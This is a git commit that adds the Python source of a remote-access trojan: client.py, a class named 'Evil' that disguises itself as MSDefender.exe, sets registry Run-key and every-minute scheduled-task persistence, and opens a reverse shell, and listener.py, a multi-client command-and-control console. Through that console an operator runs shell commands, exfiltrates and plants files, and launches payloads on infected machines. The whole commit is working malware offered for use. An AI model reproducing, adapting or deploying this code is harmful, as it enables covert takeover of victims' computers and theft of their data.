07ac838b5ddf9b1dd285f5a1054d5909d0e860a2
Un4ckn0wl3z <gh0stsync.rt@gmail.com>
2018-07-30 15:37:36 +0700

    Add files via upload

---
+++ client.py
@@ -0,0 +1,106 @@
+#!/usr/bin/env python
+
+# Created by un4ckn0wl3z-level99
+# Website -> www.un4ckn0wl3z.xyz
+# Date -> 7/28/2018
+
+import socket
+import subprocess
+import json
+import os
+import base64
+import sys
+import shutil
+
+class Evil:
+    def __init__(self,ip,port):
+        self.persist()
+        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        self.connection.connect((ip, port))
+        self.connection.send("\n[+] connection established.\n")
+
+    def reliable_send(self, data):
+        json_data = json.dumps(data)
+        self.connection.send(json_data)
+
+
+    def persist(self):
+        hidden_path = os.environ["appdata"] + "\\MSDefender.exe"
+        if not os.path.exists(hidden_path):
+            shutil.copyfile(sys.executable, hidden_path)
+            subprocess.call('reg add HKCU\Software\Microsoft\windows\CurrentVersion\Run /v update_defender /t REG_SZ /d "'+hidden_path+'"',shell=True)
+            subprocess.call('schtasks /create /tn "updatesec" /sc minute /mo 1 /tr "'+hidden_path+'"')
+    def reliable_recv(self):
+        json_data = ""
+        while True:
+            try:
+                json_data = json_data + self.connection.recv(4098)
+                return json.loads(json_data)
+            except ValueError:
+                continue
+
+    def exec_sys_cmd(self,cmd):
+        DEVNULL = open(os.devnull,'wb')
+        return subprocess.check_output(cmd,shell=True,stderr=DEVNULL,stdin=DEVNULL)
+
+    def exec_payload(self, payload):
+        # DEVNULL = open(os.devnull, 'wb')
+        try:
+            if os.path.exists('./'+payload):
+                subprocess.Popen(payload, shell=True)
+                return "[+] Payload exec."
+            else:
+                return "[-] Payload not found."
+        except Exception:
+            return "[-] Failed exec."
+
+    def change_working_dir(self,path):
+        os.chdir(path)
+        return "Changing dir to " + path
+
+    def read_file(self,path):
+        with open(path,"rb") as target_file:
+            return base64.b64encode(target_file.read())
+
+    def write_file(self,path,content):
+        with open(path,"wb") as target_file:
+            target_file.write(base64.b64decode(content))
+            return "[+] Upload Successful."
+
+    def run(self):
+        while True:
+            try:
+                # cmd_result = ""
+                cmd = self.reliable_recv()
+                if cmd[0] == "exit":
+                    self.reliable_send("Bye!")
+                    self.connection.close()
+                    sys.exit()
+                elif cmd[0] == "cd" and len(cmd) > 1:
+                    cmd_result = self.change_working_dir(cmd[1])
+                elif cmd[0] == "download" and len(cmd) > 1:
+                    cmd_result = self.read_file(cmd[1])
+                elif cmd[0] == "upload" and len(cmd) > 1:
+                    cmd_result = self.write_file(cmd[1],cmd[2])
+                elif cmd[0] == "payload" and len(cmd) > 1:
+                    cmd_result = self.exec_payload(cmd[1])
+                elif cmd[0] == "hand_shake":
+                    self.reliable_send("hand_shake_too")
+                    continue
+                else:
+                    cmd_result = self.exec_sys_cmd(cmd)
+                if not cmd_result:
+                    self.reliable_send("[-] Command exception.")
+                    continue
+                self.reliable_send(cmd_result)
+            except Exception:
+                self.reliable_send("[-] Something wrong.")
+                continue
+
+        self.connection.close()
+
+try:
+    evil = Evil("",2508)
+    evil.run()
+except Exception:
+    sys.exit()
---
+++ listener.py
@@ -0,0 +1,137 @@
+#!/usr/bin/env python
+
+# Created by un4ckn0wl3z-level99
+# Website -> www.un4ckn0wl3z.xyz
+# Date -> 7/28/2018
+
+import socket
+import json
+import base64
+import sys
+
+client_connections = []
+client_addresses = []
+glob_num_look = 0
+num_look_flag = False
+
+class Listener:
+    def __init__(self,ip,port):
+        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+        listener.bind((ip, port))
+        listener.listen(0)
+        print "[+] Waiting for incoming connection"
+        while True:
+            try:
+                self.connection, self.address = listener.accept()
+                client_connections.append(self.connection)
+                client_addresses.append(self.address)
+                print "[+] Got a connection from " + str(self.address)
+                result = self.connection.recv(1024)
+                print result
+                #break
+            except KeyboardInterrupt:
+                break
+
+    def reliable_send(self,data,num_look):
+        global glob_num_look
+        glob_num_look = num_look
+        json_data = json.dumps(data)
+        client_connections[glob_num_look].send(json_data)
+
+    def reliable_recv(self,num_look):
+        global glob_num_look
+        glob_num_look = num_look
+        json_data = ""
+        while True:
+            try:
+                json_data = json_data + client_connections[glob_num_look].recv(4098)
+                return json.loads(json_data)
+            except ValueError:
+                continue
+
+    def exec_remote(self, cmd, num_look):
+        global glob_num_look
+        glob_num_look = num_look
+        self.reliable_send(cmd, glob_num_look)
+        if cmd[0] == "exit":
+            data = self.reliable_recv(glob_num_look)
+            client_connections[glob_num_look].close()
+            client_connections.pop(glob_num_look)
+            client_addresses.pop(glob_num_look)
+            # exit()
+            global num_look_flag
+            num_look_flag = False
+            return data
+        return self.reliable_recv(glob_num_look)
+
+    def write_file(self,path,content):
+        with open(path,"wb") as target_file:
+            target_file.write(base64.b64decode(content))
+            return "[+] Download Successful."
+
+    def read_file(self, path):
+        with open(path, "rb") as target_file:
+            return base64.b64encode(target_file.read())
+
+    def run(self):
+        while True:
+            try:
+                if num_look_flag:
+                    cmd = raw_input(client_addresses[glob_num_look][0]+ " >> ")
+                else:
+                    cmd = raw_input(">> ")
+                if not cmd:
+                    continue
+                cmd = cmd.split(" ")
+
+                if cmd[0] == "num_look":
+                    global glob_num_look
+                    glob_num_look = int(cmd[1])
+                    global num_look_flag
+                    num_look_flag = True
+                    continue
+                if cmd[0] == "num_fetch":
+                    print "Current num_look is: " + str(glob_num_look)
+                    continue
+
+
+                if cmd[0] == "bye":
+                    x = 0
+                    for conn in client_connections:
+                        cmd[0] = "exit"
+                        self.exec_remote(cmd,x)
+                        x = x+1
+                    sys.exit()
+
+                if cmd[0] == "list":
+                    print "============= CLIENTS ==============="
+                    i = 0
+                    for addr in client_addresses:
+                        try:
+                            cmd[0] = "hand_shake"
+                            self.exec_remote(cmd, i)
+                        except:
+                            client_addresses.pop(i)
+                            client_connections.pop(i)
+                        print str(i) + "\t" + "IP: "+ addr[0] + " \tPORT: " + str(addr[1])
+                        i = i + 1
+                    print "============= CLIENTS ==============="
+                    continue
+
+                if cmd[0] == "upload" and len(cmd) > 1:
+                    file_content = self.read_file(cmd[1])
+                    cmd.append(file_content)
+
+                result = self.exec_remote(cmd, glob_num_look)
+
+                if cmd[0] == "download" and len(cmd) > 1:
+                    result = self.write_file(cmd[1],result)
+                print result
+            except Exception:
+                print "[-] Listener Error."
+                continue
+
+
+listener = Listener("",2508)
+listener.run()
